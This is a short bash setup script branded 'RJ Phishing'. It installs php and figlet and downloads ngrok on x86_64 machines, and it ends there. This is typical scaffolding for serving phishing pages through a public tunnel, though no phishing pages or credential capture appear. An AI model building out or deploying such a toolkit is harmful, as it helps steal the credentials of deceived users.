#!/bin/bash
clear
echo "#######################"
echo "#                     #"
echo "#     RJ Phishing     #"
echo "#     Author:Raj      #"
echo "#                     #"
echo "#######################"
sleep 2
clear
echo "Wait some Time"
sleep 2
sudo apt install php -y
clear 
sudo apt install figlet -y

raj=$(uname -m)
if [ $raj = "x86_64" ];
then 
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
fi
